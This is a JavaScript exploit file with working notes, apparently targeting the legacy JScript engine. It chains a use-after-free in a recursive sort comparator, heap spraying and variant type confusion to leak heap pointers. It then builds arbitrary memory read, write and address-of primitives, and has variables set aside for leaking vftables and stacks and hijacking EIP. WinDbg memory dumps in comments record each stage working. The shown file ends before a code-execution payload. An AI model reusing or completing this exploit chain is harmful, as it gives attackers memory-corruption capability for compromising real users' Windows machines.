// version_4 and version_3 diff is caused from analysing the need for "AAAA" and why version_2 do not need "AAAA"
// is because of the 6 byte alignment


var variants;
var padding_for_hash = "AAAAAAAAAAA";

var OBJ_FOR_ARBITRARY_READS_AND_WRITES
var PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED = "A";
var INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC = -1;
var VALUE_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_DYNAMIC = -1;

var OBJECT_TO_LEAK_A_VFTABLE_TO_LEAK_JSCRIPT;
var OBJECT_TO_LEAK_A_VFTABLE_TO_LEAK_JSCRIPT_PTR;

var OBJECT_TO_LEAK_A_STACK;
var OBJECT_TO_LEAK_A_STACK_PTR;

var OBJECT_TO_HIJACK_EIP;
var OBJECT_TO_HIJACK_EIP_PTR;

var PADDING_FOR_CONTEXT = 3000

var size = 20000
var depth = 0;
var overlay;
var overlay_backup;
var spray;
var typeConfusionedIndices = "";
var typeConfusionedArray = new Array()
var leak_lower;
var leak_verify_var;
var write_index = 0;

var web = false
var debug_mode = false // enable to show everything

function Debug(string, isDebugLog) {
    if (debug_mode) {
        if (web) {
            alert(string)
        } else {
            WScript.Echo(string)
        }
    } else {
        if (!isDebugLog) {
            if (web) {
                alert(string)
            } else {
                WScript.Echo(string)
            }  
        }
    }
}

function isInt(n){
    return Number(n) === n && n % 1 === 0;
}

function isFloat(n){
    return Number(n) === n && n % 1 !== 0;
}

function makeVariant(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper) { // Make a variant
    var charCodes = new Array();
    charCodes.push(
         // type
        type, 0, 0, 0,

         // obj_ptr
        obj_ptr_lower & 0xffff, (obj_ptr_lower >> 16) & 0xffff, obj_ptr_upper & 0xffff, (obj_ptr_upper >> 16) & 0xffff,

        // next_ptr
        next_ptr_lower & 0xffff, (next_ptr_lower >> 16) & 0xffff, next_ptr_upper & 0xffff, (next_ptr_upper >> 16) & 0xffff
        );
    return String.fromCharCode.apply(null, charCodes);
}

function set_variants(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper) {
    variants = "AAAAAAAA";
    for(i=0; i < 46; i++) {
        variants += makeVariant(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper);
    }
    variants += "AAAAAAAAA";
}

function createVariantForFloatTypeConfusionByAddingAFloatVar() {
    variants = "AAAAAAAA"; // 1 unicode char is 41 00 which is 2 bytes, 2 x 8 = 16 // Start with 16 bytes of padding to correctly align (Each string character is UTF-16)
    while(variants.length < 0x230) {
        variants += makeVariant(0x0003, 1234, 0x00000000, 0x00000000, 0x00000000);     // Generate a number of variants with type 3 (int) and the value 1234
    }
    variants += "\u0005";
}

function createVariantForFloatTypeConfusionByCreatingAVval() {
    variants = new Array(570).join('A') // exactly 0x239 bytes long
}

function legacyResetFunction() {
    overlay = new Array(); // Will be used to create VVAL structures
    for(var i=0; i < size; i++) overlay[i] = new Object(); // can use Array/Object
    spray = new Array();
    for(var i=0; i < size; i++) spray[i] = new Object();
}

function reset() {
    depth = 0;
    spray = new Array();
    overlay = new Array();
    total = new Array();
    typeConfusionedArray = new Array();
    typeConfusionedIndices = "";
    for(i = 0; i < size; i++) overlay[i] = new Object(); // Overlay must happen before spray
    for(i = 0; i < size; i++) spray[i] = new Object();
    CollectGarbage();
}

function uaf_type_confusion_exploit(untracked_1, untracked_2) {
    if(depth == 100) {
        for(var i=0; i < size; i++) spray[i] = 0;
        CollectGarbage();
        for(var i=0; i < size; i++) {
            overlay[i][variants] = 1;
            overlay[i]["AAAAAAAAAAA"] = 1;    // Required in order to align the untracked variable
            overlay[i]["\u0005"] = 1;   // The hash-manipulating value.

            // first step: obtain pointers to BSTR VAR
            // our untracked variable will point to this FLOAT VAR whose obj_ptr points to our "A" VVAL/VAR structure (address to "A" VVAL/VAR structure)
            // hence, address to "A" VAR will be leaked (e.g. 0x12345678)

            // second step: read value stored at 0x12345678, as 0x12345678's points to i
            // We can then create BSTR VARs whose obj_ptr set to 0x12345678
            // Hence we will read whatever 0x12345678 is pointing to

            overlay[i][PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED] = i; // The next property that will get leaked.
        }
    } else {
        untracked_1 = spray[depth*2];
        untracked_2 = spray[depth*2 + 1];
        var tempDepth = depth
        depth += 1;
        [0,0].sort(uaf_type_confusion_exploit);
        /**/   
        if(typeof untracked_1 === "number") { 
            var tempArray = new Array()
            tempArray[0] = tempDepth
            tempArray[1] = untracked_1
            typeConfusionedArray.push(tempArray)
        }
        if(typeof untracked_2 === "number") { 
            var tempArray = new Array()
            tempArray[0] = tempDepth
            tempArray[1] = untracked_2
            typeConfusionedArray.push(tempArray)
        }  
        if(typeof untracked_1 === "number" || typeof untracked_2 === "number") { 
            typeConfusionedIndices += tempDepth.toString() ; 
            typeConfusionedIndices += " " 
        }
        /**/
        /*
        typeConfusionedArray.push(untracked_1)
        typeConfusionedArray.push(untracked_2) 
        */
    }
    return 4;
}

// We have sprayed 0x5 type floats and type confused one of the variables. *next pointer to PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED value 
function get_var_obj_ptr_to_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_via_float_type_confusion() {
    /**/
    for (var i = 0; i < typeConfusionedArray.length; i++) {
        var temp = typeConfusionedArray[i][1]
        if(typeof temp === "number") { 
            if (isFloat(temp)) {
                var leak = (temp / 4.9406564584124654E-324); // VVAL *next pointer i guess?
                leak_lower =  leak
                Debug("Leaked pointer to a VVAL structure: 0x" + leak.toString(16), false) 
                break
            }
        } 
    }
    //Debug("Out of n pairs of variables, the following have been successfully type confused: " + typeConfusionedIndices)
    /**/
    /*
    for (var i = 0; i < typeConfusionedArray.length; i++) {
        if(typeof typeConfusionedArray[i] === "number" && typeConfusionedArray[i] % 1 != 0) {
            leak_lower = (typeConfusionedArray[i] / 4.9406564584124654E-324); // This division just converts the float into an easy-to-read 32-bit number
            Debug(leak_lower.toString(16))
            break;
        } 
    }
    */
}

function get_index_to_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC_via_bstr_var_type_confusion_obj_pointer() {
    /**/
    for (var i = 0; i < typeConfusionedArray.length; i++) {
        var temp = typeConfusionedArray[i][1]
        if(typeof temp === "number") { 
            INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC = parseInt(temp + ""); // temp is from typeConfusionedArray[i][1] which is dynamic. By running parseInt, we make the value static
            VALUE_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_DYNAMIC = temp;
            break
        }
    }
    //Debug("Out of n pairs of variables, the following have been successfully type confused: " + typeConfusionedIndices)
    /**/
    /*
    for (var i = 0; i < typeConfusionedArray.length; i++) {
        if(typeof typeConfusionedArray[i] === "number") {
            leak_offset = parseInt(typeConfusionedArray[i] + "");
            leak_verify_var = typeConfusionedArray[i];
            break;
        } 
    }
    */
}

// Spray is to allocate GcBlocks to be freed later (0x970)
// Overlay is to allocate after GcBlocks are freed
// Any value which points to Spray should end up pointing to Overlay
// Values from typeConfusionedArray are from Spray
// rewrite baiscally gives us the power to write to the value of the BSTR property name to which we have an address to
// VALUE_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED is derived from typeConfusionedArray which is derived from spray which is derived from overlay
// hence changing the overlay should change the VALUE_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED
function write_controlled_VVAL_structure(property_name_value, write_value){
    CollectGarbage(); // Get rid of anything that still needs to be freed before starting
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC] = null; // Remove the reference to target object
    CollectGarbage(); // Free the object
    set_variants(0x80, leak_lower);
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC] = new Object(); // New object - Should end up in the same slot as the last object
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC][variants] = 1; // Reallocate the newly freed location
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC]["AAAAAAAAAAA"] = 1; // Perform the padding again
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC]["\u0006"] = 1; // Create the leak var again - this does not matter as long as its 1 unicode, we are creating a write primative
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC][property_name_value] = write_value; // Reallocate over the area with a new property name and a new VAR assigned. This name will be at a known location since the address of this VVAL is already known
}

/*
0:008> dd 040c9a20  La0
00000000`040c9a20  00000003 00000000 00000000 00000000
00000000`040c9a30  00000000 00000000 00000000 00000000
00000000`040c9a40  00000061 00000002 00000000 00000000
00000000`040c9a50  00000000 00000000 00000004 00000000
00000000`040c9a60  00000041 00000000 040c9a70 00000000
00000000`040c9a70  00000000 00000000 040bda00 00000000
00000000`040c9a80  040c9a88 00000000 00000000 00000000
00000000`040c9a90  040bd990 00000000 040c9aa0 00000000
00000000`040c9aa0  00000000 00000000 040bd920 00000000
00000000`040c9ab0  040c9ab8 00000000 00000000 00000000
00000000`040c9ac0  040bd8b0 00000000 040c9ad0 00000000
00000000`040c9ad0  00000000 00000000 040bd840 00000000
00000000`040c9ae0  040c9ae8 00000000 00000000 00000000
00000000`040c9af0  040bd7d0 00000000 040c9b00 00000000
00000000`040c9b00  00000000 00000000 040bd760 00000000
00000000`040c9b10  040c9b18 00000000 00000000 00000000
00000000`040c9b20  040bd6f0 00000000 040c9b30 00000000
00000000`040c9b30  00000000 00000000 040bd680 00000000
00000000`040c9b40  040c9b48 00000000 00000000 00000000
00000000`040c9b50  040bd610 00000000 040c9b60 00000000
00000000`040c9b60  00000000 00000000 040bd5a0 00000000
00000000`040c9b70  040c9b78 00000000 00000000 00000000
00000000`040c9b80  040bd530 00000000 040c9b90 00000000
00000000`040c9b90  00000000 00000000 040bd4c0 00000000
00000000`040c9ba0  040c9ba8 00000000 00000000 00000000
00000000`040c9bb0  040bd450 00000000 040c9bc0 00000000
00000000`040c9bc0  00000000 00000000 040bd3e0 00000000
00000000`040c9bd0  040c9bd8 00000000 00000000 00000000
00000000`040c9be0  040bd370 00000000 040c9bf0 00000000
00000000`040c9bf0  00000000 00000000 040bd300 00000000
00000000`040c9c00  040c9c08 00000000 00000000 00000000
00000000`040c9c10  040bd290 00000000 040c9c20 00000000
00000000`040c9c20  00000000 00000000 040bd220 00000000
00000000`040c9c30  040c9c38 00000000 00000000 00000000
00000000`040c9c40  040bd1b0 00000000 040c9c50 00000000
00000000`040c9c50  00000000 00000000 040bd140 00000000
00000000`040c9c60  040c9c68 00000000 00000000 00000000
00000000`040c9c70  040bd0d0 00000000 040c9c80 00000000
00000000`040c9c80  00000000 00000000 040bd060 00000000
00000000`040c9c90  040c9c98 00000000 00000000 00000000
------------------------------------------------------
------------------------------------------------------
AFTER-------------------------------------------------
------------------------------------------------------
------------------------------------------------------
0:006> dc 040c9a20  La0
00000000`040c9a20  00150003 00000000 00000032 00000000  ........2.......
00000000`040c9a30  00000000 00000000 00000000 00000000  ................
00000000`040c9a40  136f354f 00000046 00000000 00000000  O5o.F...........
00000000`040c9a50  00000000 00000000 00000004 00000000  ................
00000000`040c9a60  00680074 00730069 0064005f 0065006f  t.h.i.s._.d.o.e.
00000000`040c9a70  005f0073 006f006e 005f0074 00650072  s._.n.o.t._.r.e.
00000000`040c9a80  006c0061 0079006c 006d005f 00740061  a.l.l.y._.m.a.t.
00000000`040c9a90  00650074 005f0072 006f0066 005f0072  t.e.r._.f.o.r._.
00000000`040c9aa0  006f006e 00000077 040bd920 00000000  n.o.w... .......
...
0:006> ? 0x32
Evaluate expression: 50 = 00000000`00000032
*/
function test_write_controlled_VVAL_structure(val) {
    write_controlled_VVAL_structure("this_does_not_really_matter_for_now", val);
    if(VALUE_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_DYNAMIC+"" != val) {
        throw Error("Couldn't re-write variable");
    }
    Debug("test_write(val) function works", true)
}

function get_obj_through_the_name_of_the_last_VVAL_structure_via_int_type_confusion_obj_pointer(value) {
    for (var i = 0; i < typeConfusionedArray.length; i++) {
        var temp = typeConfusionedArray[i][1]
        if(typeof temp === "number") { 
            if(temp + "" == value) {
                OBJ_FOR_ARBITRARY_READS_AND_WRITES = temp;
                break;
            }
        }
    }
}

/*
0n67213856 is the leak address
0:008> dq 0n67213856 La0
00000000`04019a20  00000000`00000000 00000000`00000000
00000000`04019a30  00000000`00000000 00000000`00000000
00000000`04019a40  00000018`89e651c5 00000000`00000000
00000000`04019a50  00000000`00000000 00000000`00000004
00000000`04019a60  00000000`00000003 00000000`000004d2
00000000`04019a70  00000000`00000000 00650072`005f0000
00000000`04019a80  0079006c`006c0061 00740061`006d005f
00000000`04019a90  005f0072`00650074 005f0072`006f0066
00000000`04019aa0  00000077`006f006e 00000000`0400d920
00000000`04019ab0  00000000`04019ab8 00000000`00000000
00000000`04019ac0  00000000`0400d8b0 00000000`04019ad0
00000000`04019ad0  00000000`00000000 00000000`0400d840
00000000`04019ae0  00000000`04019ae8 00000000`00000000
00000000`04019af0  00000000`0400d7d0 00000000`04019b00
00000000`04019b00  00000000`00000000 00000000`0400d760
00000000`04019b10  00000000`04019b18 00000000`00000000
00000000`04019b20  00000000`0400d6f0 00000000`04019b30
00000000`04019b30  00000000`00000000 00000000`0400d680
00000000`04019b40  00000000`04019b48 00000000`00000000
00000000`04019b50  00000000`0400d610 00000000`04019b60
00000000`04019b60  00000000`00000000 00000000`0400d5a0
00000000`04019b70  00000000`04019b78 00000000`00000000
00000000`04019b80  00000000`0400d530 00000000`04019b90
00000000`04019b90  00000000`00000000 00000000`0400d4c0
00000000`04019ba0  00000000`04019ba8 00000000`00000000
00000000`04019bb0  00000000`0400d450 00000000`04019bc0
00000000`04019bc0  00000000`00000000 00000000`0400d3e0
00000000`04019bd0  00000000`04019bd8 00000000`00000000
00000000`04019be0  00000000`0400d370 00000000`04019bf0
00000000`04019bf0  00000000`00000000 00000000`0400d300
00000000`04019c00  00000000`04019c08 00000000`00000000
00000000`04019c10  00000000`0400d290 00000000`04019c20
00000000`04019c20  00000000`00000000 00000000`0400d220
00000000`04019c30  00000000`04019c38 00000000`00000000
00000000`04019c40  00000000`0400d1b0 00000000`04019c50
00000000`04019c50  00000000`00000000 00000000`0400d140
00000000`04019c60  00000000`04019c68 00000000`00000000
00000000`04019c70  00000000`0400d0d0 00000000`04019c80
00000000`04019c80  00000000`00000000 00000000`0400d060
00000000`04019c90  00000000`04019c98 00000000`00000000
00000000`04019ca0  00000000`0400cff0 00000000`04019cb0
00000000`04019cb0  00000000`00000000 00000000`0400cf80
00000000`04019cc0  00000000`04019cc8 00000000`00000000
00000000`04019cd0  00000000`0400cf10 00000000`04019ce0
00000000`04019ce0  00000000`00000000 00000000`0400cea0
00000000`04019cf0  00000000`04019cf8 00000000`00000000
00000000`04019d00  00000000`0400ce30 00000000`04019d10
00000000`04019d10  00000000`00000000 00000000`0400cdc0
00000000`04019d20  00000000`04019d28 00000000`00000000
00000000`04019d30  00000000`0400cd50 00000000`04019d40
00000000`04019d40  00000000`00000000 00000000`0400cce0
00000000`04019d50  00000000`04019d58 00000000`00000000
00000000`04019d60  00000000`0400cc70 00000000`04019d70
00000000`04019d70  00000000`00000000 00000000`0400cc00
00000000`04019d80  00000000`04019d88 00000000`00000000
00000000`04019d90  00000000`0400cb90 00000000`04019da0
00000000`04019da0  00000000`00000000 00000000`0400cb20
00000000`04019db0  00000000`04019db8 00000000`00000000
00000000`04019dc0  00000000`0400cab0 00000000`04019dd0
00000000`04019dd0  00000000`00000000 00000000`0400ca40
00000000`04019de0  00000000`04019de8 00000000`00000000
00000000`04019df0  00000000`0400c9d0 00000000`04019e00
00000000`04019e00  00000000`00000000 00000000`0400c960
00000000`04019e10  00000000`04019e18 00000000`00000000
00000000`04019e20  00000000`0400c8f0 00000000`04018b40
00000000`04019e30  00000000`00000000 00000000`00000000
00000000`04019e40  00000000`00000000 a00000c3`0b284dbf
00000000`04019e50  00000000`00000000 00000000`00000003
00000000`04019e60  00000000`00000001 00000000`00000000
00000000`04019e70  00000000`00000000 00000472`712d9f59
00000000`04019e80  00000000`0401a310 00000000`00000000
00000000`04019e90  00000000`00000001 00410041`00410041
00000000`04019ea0  00410041`00410041 00410041`00410041
00000000`04019eb0  00410041`00410041 00410041`00410041
00000000`04019ec0  00410041`00410041 00410041`00410041
00000000`04019ed0  00410041`00410041 00410041`00410041
00000000`04019ee0  00410041`00410041 00410041`00410041
00000000`04019ef0  00410041`00410041 00410041`00410041
00000000`04019f00  00410041`00410041 00410041`00410041
00000000`04019f10  00410041`00410041 00410041`00410041
------------------------------------------------------
------------------------------------------------------
AFTER-------------------------------------------------
------------------------------------------------------
------------------------------------------------------
0:009> dq 0n67213856 La0
00000000`04019a20  00000002`00000005 00000000`0277edfd
00000000`04019a30  00000000`00000000 00000000`00000000
00000000`04019a40  00000018`fe44c7cb 00000000`00000000
00000000`04019a50  00000000`04019980 00000000`00000004
00000000`04019a60  00000000`00000003 00000000`00000038
00000000`04019a70  00000000`00000000 00650072`005f0000
00000000`04019a80  0079006c`006c0061 00740061`006d005f
00000000`04019a90  005f0072`00650074 005f0072`006f0066
00000000`04019aa0  00000077`006f006e 00000000`0400d920
00000000`04019ab0  00000000`04019ab8 00000000`00000000
00000000`04019ac0  00000000`0400d8b0 00000000`04019ad0
00000000`04019ad0  00000000`00000000 00000000`0400d840
00000000`04019ae0  00000000`04019ae8 00000000`00000000
00000000`04019af0  00000000`0400d7d0 00000000`04019b00
00000000`04019b00  00000000`00000000 00000000`0400d760
00000000`04019b10  00000000`04019b18 00000000`00000000
00000000`04019b20  00000000`0400d6f0 00000000`04019b30
00000000`04019b30  00000000`00000000 00000000`0400d680
00000000`04019b40  00000000`04019b48 00000000`00000000
00000000`04019b50  00000000`0400d610 00000000`04019b60
00000000`04019b60  00000000`00000000 00000000`0400d5a0
00000000`04019b70  00000000`04019b78 00000000`00000000
00000000`04019b80  00000000`0400d530 00000000`04019b90
00000000`04019b90  00000000`00000000 00000000`0400d4c0
00000000`04019ba0  00000000`04019ba8 00000000`00000000
00000000`04019bb0  00000000`0400d450 00000000`04019bc0
00000000`04019bc0  00000000`00000000 00000000`0400d3e0
00000000`04019bd0  00000000`04019bd8 00000000`00000000
00000000`04019be0  00000000`0400d370 00000000`04019bf0
00000000`04019bf0  00000000`00000000 00000000`0400d300
00000000`04019c00  00000000`04019c08 00000000`00000000
00000000`04019c10  00000000`0400d290 00000000`04019c20
00000000`04019c20  00000000`00000000 00000000`0400d220
00000000`04019c30  00000000`04019c38 00000000`00000000
00000000`04019c40  00000000`0400d1b0 00000000`04019c50
00000000`04019c50  00000000`00000000 00000000`0400d140
00000000`04019c60  00000000`04019c68 00000000`00000000
00000000`04019c70  00000000`0400d0d0 00000000`04019c80
00000000`04019c80  00000000`00000000 00000000`0400d060
00000000`04019c90  00000000`04019c98 00000000`00000000
00000000`04019ca0  00000000`0400cff0 00000000`04019cb0
00000000`04019cb0  00000000`00000000 00000000`0400cf80
00000000`04019cc0  00000000`04019cc8 00000000`00000000
00000000`04019cd0  00000000`0400cf10 00000000`04019ce0
00000000`04019ce0  00000000`00000000 00000000`0400cea0
00000000`04019cf0  00000000`04019cf8 00000000`00000000
00000000`04019d00  00000000`0400ce30 00000000`04019d10
00000000`04019d10  00000000`00000000 00000000`0400cdc0
00000000`04019d20  00000000`04019d28 00000000`00000000
00000000`04019d30  00000000`0400cd50 00000000`04019d40
00000000`04019d40  00000000`00000000 00000000`0400cce0
00000000`04019d50  00000000`04019d58 00000000`00000000
00000000`04019d60  00000000`0400cc70 00000000`04019d70
00000000`04019d70  00000000`00000000 00000000`0400cc00
00000000`04019d80  00000000`04019d88 00000000`00000000
00000000`04019d90  00000000`0400cb90 00000000`04019da0
00000000`04019da0  00000000`00000000 00000000`0400cb20
00000000`04019db0  00000000`04019db8 00000000`00000000
00000000`04019dc0  00000000`0400cab0 00000000`04019dd0
00000000`04019dd0  00000000`00000000 00000000`0400ca40
00000000`04019de0  00000000`04019de8 00000000`00000000
00000000`04019df0  00000000`0400c9d0 00000000`04019e00
00000000`04019e00  00000000`00000000 00000000`0400c960
00000000`04019e10  00000000`04019e18 00000000`00000000
00000000`04019e20  00000000`0400c8f0 00000000`04018b40
00000000`04019e30  00000000`00000000 00000000`00000000
00000000`04019e40  00000000`00000000 a00000c3`0b284dbf
00000000`04019e50  00000000`00000000 00000000`00000003
00000000`04019e60  00000000`00000001 00000000`00000000
00000000`04019e70  00000000`00000000 00000472`712d9f59
00000000`04019e80  00000000`0401a310 00000000`00000000
00000000`04019e90  00000000`00000001 00410041`00410041
00000000`04019ea0  00410041`00410041 00410041`00410041
00000000`04019eb0  00410041`00410041 00410041`00410041
00000000`04019ec0  00410041`00410041 00410041`00410041
00000000`04019ed0  00410041`00410041 00410041`00410041
00000000`04019ee0  00410041`00410041 00410041`00410041
00000000`04019ef0  00410041`00410041 00410041`00410041
00000000`04019f00  00410041`00410041 00410041`00410041
00000000`04019f10  00410041`00410041 00410041`00410041
0:009> dc 0n67213856+0n64
00000000`04019a60  00000003 00000000 00000038 00000000  ........8.......
00000000`04019a70  00000000 00000000 005f0000 00650072  .........._.r.e.
00000000`04019a80  006c0061 0079006c 006d005f 00740061  a.l.l.y._.m.a.t.
00000000`04019a90  00650074 005f0072 006f0066 005f0072  t.e.r._.f.o.r._.
00000000`04019aa0  006f006e 00000077 0400d920 00000000  n.o.w... .......
00000000`04019ab0  04019ab8 00000000 00000000 00000000  ................
00000000`04019ac0  0400d8b0 00000000 04019ad0 00000000  ................
00000000`04019ad0  00000000 00000000 0400d840 00000000  ........@.......
0:009> ? 0x38
Evaluate expression: 56 = 00000000`00000038
0:008> ? 0277edfd
Evaluate expression: 41414141 = 00000000`0277edfd
*/
function test_obj(value) {
    write_controlled_VVAL_structure(makeVariant(3, value), 41414141); // value to "A" does not matter, changing "A" itself matters
    // since we set_variant(0x80, leak_pointer+64), we are pointing to the name field
    if(OBJ_FOR_ARBITRARY_READS_AND_WRITES + "" != value) { // Turning it to a string causes the conversion to copy, dereferencing the 0x80 type. Type 0x80 being used directly won't work.
        throw Error("Couldn't re-write fakeobj variable");
    }
    Debug("test_obj(val) function works", true)
}

// sets "A" VVAL/VAR structure as a type 8 BSTR string 
// sets value to this VVAL/VAR structure as o
// addr_lower and addr_higher will set the pointer to the type 0x8 bstr string
function write_VVAL_to_read_later(addr_lower, addr_higher, o) {
    write_controlled_VVAL_structure(makeVariant(8, addr_lower, addr_higher), o);
}

// read_byte: Reads the byte at the address using the length of the BSTR.
// offset to point to the length of the BSTR string?
function read_byte(addr_lower, addr_higher, o) {
    write_VVAL_to_read_later(addr_lower + 2, addr_higher, o); // Use the length. However, when the length is found, it is divided by 2 (BSTR_LENGTH >> 1) so changing this offset allows us to read a byte properly.
    return (OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 15) & 0xff; // Shift to align and get the byte.
}

// read_word: Reads the WORD (2 bytes) at the specified address.
function read_word(addr_lower, addr_higher, o) {
    write_VVAL_to_read_later(addr_lower + 2, addr_higher, o);
    return ((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 15) & 0xff) + (((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 23) & 0xff) << 8);
}

// read_dword: Reads the DWORD (4 bytes) at the specified address.
function read_dword(addr_lower, addr_higher, o) {
    write_VVAL_to_read_later(addr_lower + 2, addr_higher, o);
    lower = ((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 15) & 0xff) + (((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 23) & 0xff) << 8);
    write_VVAL_to_read_later(addr_lower + 4, addr_higher, o);
    upper = ((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 15) & 0xff) + (((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 23) & 0xff) << 8);
    return lower + (upper << 16);
}

// read_qword: Reads the QWORD (8 bytes) at the specified address.
function read_qword(addr_lower, addr_higher, o) {
    // Lower
    write_VVAL_to_read_later(addr_lower + 2, addr_higher, o);
    lower_lower = ((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 15) & 0xff) + (((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 23) & 0xff) << 8);
    write_VVAL_to_read_later(addr_lower + 4, addr_higher, o);
    lower_upper = ((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 15) & 0xff) + (((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 23) & 0xff) << 8);

    // Upper
    write_VVAL_to_read_later(addr_lower + 6, addr_higher, o);
    upper_lower = ((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 15) & 0xff) + (((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 23) & 0xff) << 8);
    write_VVAL_to_read_later(addr_lower + 8, addr_higher, o);
    upper_upper = ((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 15) & 0xff) + (((OBJ_FOR_ARBITRARY_READS_AND_WRITES.length >> 23) & 0xff) << 8);
    return {'lower': lower_lower + (lower_upper << 16), 'upper': upper_lower + (upper_upper << 16)};
}

// test_read: Used to test whether the arbitrary read works. 
// leak_lower + 64 points to the wchar_t name[] of "A" VVAL/VAR structure essentially, which should be "A" itself
// using read_*() functions, we can set "A" to a type 0x8 BSTR string VAR whose obj_ptr = leak_lower + 64
// using read_*() functions, we always write to leak_lower + 8 then read from specified address
// so we are reading 1 byte from "A" which is now a type 0x8 VAR with leak_lower + 64 as obj_ptr
// we use OBJ_FOR_ARBITRARY_READS_AND_WRITES.length which is derived from get_obj_through_the_name_of_the_last_VVAL_structure_via_int_type_confusion_obj_pointer()
// OBJ_FOR_ARBITRARY_READS_AND_WRITES is from typeConfusionedArray[i][1] which we can control the value to
// The byte at this address is therefore expected to be 8 (String VAR type).
// we will read 1 byte from leak_lower + 64 which is a type 0x8 BSTR VAR which the first byte should be a 0x8
function test_read_bwdq() {
    if(read_byte(leak_lower + 64, 0x0, 0x42424242) != 8) { // pointer to the name property of the "A" VVAL structure, should point to 
        throw Error("Arbitrary read failed.");
    }
    Debug("test_read_bwdq() function works", true)
}

// addrof: The 'address-of' primitive. 
// Changes the VAR at the start of the VVAL to point to a given object and changes the fakeobj_var string to point to the object pointer of this VAR, 
// thus allowing the address to be read.
// leak_lower points to the memory address of the "A" VVAL/VAR struct
// leak_lower+8 points to the obj_ptr of the VAR of the VVAL structure
// since read_dword will eventuall create a type 8 BSTR string VAR to replace "A" in the VVAL/VAR struct
// leak_lower+8 should be a pointer to a string, in this case, it should be to o
// we will read 4 bytes from leak_lower + 8 which should point to the address of the o VAR
// we will read 4 bytes from o VAR + 8 which should point to the address of o
/*
3fd9a28    => leak_lower + 8 
0x12345678 => o
0:008> dd 3fd9a28  
00000000`03fd9a28  12345678 41ebd5b7 00000003 00000000
00000000`03fd9a38  00000000 00000000 de7ebcd1 00000018
00000000`03fd9a48  00000000 00000000 00000000 00000000
00000000`03fd9a58  00000004 00000000 00000008 00000000
00000000`03fd9a68  03fd9a2c 00000000 00000000 00000000
00000000`03fd9a78  005f0000 00650072 006c0061 0079006c
00000000`03fd9a88  006d005f 00740061 00650074 005f0072
00000000`03fd9a98  006f0066 005f0072 006f006e 00000077
*/
/*
0:008> dd 4081a40 (leak_lower)
00000000`04081a40  002e0005 00000000 dde00000 41ebd5b7
00000000`04081a50  00000003 00000000 00000000 00000000
00000000`04081a60  82fef9f2 00000018 00000000 00000000
00000000`04081a70  00000000 00000000 00000004 00000000
00000000`04081a80  00000008 00000000 04081a82 00000000
00000000`04081a90  00000000 00000000 005f0000 00650072
00000000`04081aa0  006c0061 0079006c 006d005f 00740061
00000000`04081ab0  00650074 005f0072 006f0066 005f0072
------------------------------------------------------
------------------------------------------------------
AFTER-------------------------------------------------
------------------------------------------------------
------------------------------------------------------
0:009> dd 4081a40 (leak_lower)
00000000`04081a40  002e0080 00000000 0431e4d0 00000000
00000000`04081a50  00090000 00000000 00000000 00000000
00000000`04081a60  5a42541c 00000018 00000000 00000000
00000000`04081a70  00000000 00000000 00000004 00000000
00000000`04081a80  00000008 00000000 04081a4c 00000000
00000000`04081a90  00000000 00000000 005f0000 00650072
00000000`04081aa0  006c0061 0079006c 006d005f 00740061
00000000`04081ab0  00650074 005f0072 006f0066 005f0072
var_addr = 431e4d0 (o)
0:004> dd 431e4d0
00000000`0431e4d0  00000081 00000000 084300b0 00000000
00000000`0431e4e0  0009f3d0 00000000 00000081 00000000
00000000`0431e4f0  0bb01110 00000000 0431e518 00000000
00000000`0431e500  00000082 00000000 003b1288 00000000
00000000`0431e510  0039fe30 00000000 00000081 00000000
00000000`0431e520  0bb010a0 00000000 0431e530 00000000
00000000`0431e530  00000081 00000000 0bb01030 00000000
00000000`0431e540  0431e548 00000000 00000081 00000000
return what 431e4d0+8 is pointing to which is 084300b0
obj_ptr_addr = 084300b0
0:004> dd 084300b0 (this is address of obj)
00000000`084300b0  ef1bae68 000007fe 00000000 00000000
*/
function get_address_to_given_object(object_to_get) {
    var_addr = read_dword(leak_lower + 8, 0, object_to_get); // Dereference the first VAR
    return read_dword(var_addr + 8, 0, 0x43434343); // Get the Object pointer of the second VAR
}

// string_addr: Gets the address of a string in an object that can be used in a chain.
function get_address_to_given_string(string_to_get) {
    return {'lower': get_address_to_given_object(string_to_get), 'upper': 0};
}

